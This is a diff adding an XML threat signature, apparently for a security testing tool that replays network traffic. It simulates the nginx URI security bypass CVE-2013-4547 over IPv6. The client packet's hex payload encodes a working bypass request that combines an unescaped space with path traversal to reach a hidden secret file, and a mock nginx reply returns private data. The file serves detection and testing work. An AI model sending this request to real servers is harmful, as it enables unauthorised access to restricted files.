@@ -1,0 +1,87 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Nginx Request URI Verification Security Bypass(IPv6 Version)"/>
+    <EngDesc display="true" value="There exists a security bypass vulnerability in Nginx. The vulnerability is caused by improper handling of unescaped space characters within URIs. A remote attacker can exploit this vulnerability to bypass security restrictions in certain configurations."/>
+    <Intent display="true">
+      <item value="INPUT_VALIDATION_ERROR"/>
+    </Intent>
+    <Protocol display="true" value="HTTP,HTTPS,IPV6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="High"/>
+    <Known_Vendors_Affected display="true">
+      <item value="nginx"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="HTTP_Server"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="1.5.x_prior_to_1.5.7"/>
+      <item value="1.x_prior_1.4.4"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20131120-01"/>
+    <CVEID display="true" value="CVE-2013-4547"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="100015"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="da68329a4684d8ff6c72c7ad14bf0b41"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="NETWORK"/>
+    <AccessComplexity display="false" value="MEDIUM"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635355968078891732"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1400059818" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="D"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+    <for index="B">
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:50:56:B4:0D:59" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="3FFE::0200:FF:FE00:2" Destination-Address="$destIP">
+        <TCP srcPort="41850" destPort="$HTTPdestPort" SeqNumber="01ED9A3E" AckNumber="C97C54CE" HeaderLength="08" WindowSize="002E" Checksum="3A2D" UrgentPointer="0000" Options="0101080A417173EF001167CF" Payload="474554202F636F6E74656E74202F2E2E2F68696464656E2F7365637265742E68746D6C20485454502F312E310D0A486F73743A203137322E31362E382E3234380D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:50:56:B4:0D:59" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$destIP" Destination-Address="3FFE::0200:FF:FE00:1">
+          <TCP srcPort="$HTTPdestPort" destPort="41850" SeqNumber="C97C54CE" AckNumber="01ED9A82" HeaderLength="08" WindowSize="0389" Checksum="5D2B" UrgentPointer="0000" Options="0101080A001167D0417173EF" Payload="485454502F312E3120323030204F4B0D0A5365727665723A206E67696E782F312E342E330D0A446174653A204672692C203232204E6F7620323031332031363A34343A353220474D540D0A436F6E74656E742D547970653A20746578742F68746D6C0D0A436F6E74656E742D4C656E6774683A2034380D0A4C6173742D4D6F6469666965643A204672692C203232204E6F7620323031332031353A32383A333620474D540D0A436F6E6E656374696F6E3A206B6565702D616C6976650D0A455461673A202235323866373832342D3330220D0A4163636570742D52616E6765733A2062797465730D0A0D0A3C68746D6C3E0A3C626F64793E0A50726976617465206461746120686572650A3C2F626F64793E0A3C2F68746D6C3E0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
